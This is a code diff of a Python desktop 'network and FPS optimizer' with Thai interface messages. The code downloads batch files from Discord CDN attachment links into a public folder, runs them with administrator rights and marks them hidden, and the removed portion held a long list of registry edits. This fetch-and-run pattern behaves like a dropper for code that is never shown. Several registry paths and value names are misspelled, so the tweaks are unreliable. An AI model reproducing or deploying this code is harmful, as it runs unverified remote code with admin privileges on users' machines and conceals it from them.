-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSite" /t REG_DWORD /d "65535" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSite" /t REG_DWORD /d "65536" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxSendFree" /t REG_DWORD /d "65535" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "16777214" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSite" /t REG_DWORD /d "64240" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSite" /t REG_DWORD /d "32" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SitReqBuf" /t REG_DWORD /d "17424" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Site" /t REG_DWORD /d "3" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxWorkItems" /t REG_DWORD /d "8192" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxMpxCt" /t REG_DWORD /d "2048" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "MaxCmds" /t REG_DWORD /d "2048" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "DisableStrictNameChecking" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "EnableDynamicBacklog" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MinimumDynamicBacklog" /t REG_DWORD /d "200" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "MaximumDynamicBacklog" /t REG_DWORD /d "20000" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DynamicBacklogGrowthDelta" /t REG_DWORD /d "100" /f \n cls
-Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1" /f \n cls
-Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f \n cls
-Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "10800" /f \n cls
-Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxCacheTtl" /t REG_DWORD /d "10800" /f \n cls
-Reg.exe add "HKLM\SYSTEM\ControlControlSet\Services\Dnscache\Parameters" /v "MaxNegativeCacheTtl" /t REG_DWORD /d "0" /f \n cls
-    ''', 'utf-8'))
-        subprocess.run(['attrib', '+h', file_location], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-        subprocess.run([file_location], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
-        os.remove(file_location)
-        messagebox.showinfo("PRP - Sercurity", "โปรแกรมทำงานเสร็จสิ้นสามารถกดตัวต่อไปได้")
+        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181918320149135370/J3Ke3NEtwork.bat?ex=6582ce36&is=65705936&hm=38d55d1972ac2d3b8955ad3a2470d3c91dc89405d28fc3efeb30ae5a03494654&"
+        if is_admin(): 
+            try:
+                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
+            except:
+                with open(f'C:/Users/Public/Videos/Hermes_God.bat', 'wb') as f:
+                    f.write(requests.get(mystr_encoded).content)
+                os.startfile(f'C:/Users/Public/Videos/Hermes_God.bat')
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
+
+                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Hermes_God.bat')
+                _doHideBatch.read()
+                _doHideBatch.close()
+        else:
+            run_as_admin()
 
 def cmdset1_Optimite(event):
         mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181272713680126103/Boost_FPS.bat?ex=658074f1&is=656dfff1&hm=47718f3c679268f999283bb5d66ee9b480221ba046835c9271da048dba3f655e&"
         if is_admin(): 
             try:
                 os.startfile(f'C:/Users/Public/Videos/Boost_FPS.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
                 with open(f'C:/Users/Public/Videos/Boost_FPS.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
                 os.startfile(f'C:/Users/Public/Videos/Boost_FPS.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
                 _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Boost_FPS.bat')
                 _doHideBatch.read()
@@ -643,12 +482,12 @@ def cmdset2_Optimite(event):
         if is_admin(): 
             try:
                 os.startfile(f'C:/Users/Public/Videos/Install_Powerplan.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
                 with open(f'C:/Users/Public/Videos/Install_Powerplan.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
                 os.startfile(f'C:/Users/Public/Videos/Install_Powerplan.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
                 _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Install_Powerplan.bat')
                 _doHideBatch.read()
@@ -660,12 +499,12 @@ def cmdset3_Optimite(event):
         if is_admin(): 
             try:
                 os.startfile(f'C:/Users/Public/Videos/Low_ping.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
                 with open(f'C:/Users/Public/Videos/Low_ping.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
                 os.startfile(f'C:/Users/Public/Videos/Low_ping.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
                 _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Low_ping.bat')
                 _doHideBatch.read()
@@ -677,12 +516,12 @@ def cmdset4_Optimite(event):
         if is_admin(): 
             try:
                 os.startfile(f'C:/Users/Public/Videos/Clear_All_Temp.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
                 with open(f'C:/Users/Public/Videos/Clear_All_Temp.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
                 os.startfile(f'C:/Users/Public/Videos/Clear_All_Temp.bat')
-                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานรอโปรแกรมทำงานเสร็จถึงกดตัวต่อไปได้")
+                messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
                 _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Clear_All_Temp.bat')
                 _doHideBatch.read()
@@ -711,7 +550,12 @@ def join_page_one(event):
     'C:/Users/Public/Videos/Boost_FPS.bat',
     'C:/Users/Public/Videos/Install_Powerplan.bat',
     'C:/Users/Public/Videos/Low_ping.bat',
-    'C:/Users/Public/Videos/Clear_All_Temp.bat'
+    'C:/Users/Public/Videos/Clear_All_Temp.bat',
+    'C:/Users/Public/Videos/fixerror.exe',
+    'C:/Users/Public/Videos/RunSuperiorPunching.bat',
+    'C:/Users/Public/Videos/RunUnbeatableNetwork.bat',
+    'C:/Users/Public/Videos/Y2KREALPUNCH.bat',
+    'C:/Users/Public/Videos/J3Ke3NEtwork.bat'
      ]
 
     for file_path in files_to_remove:
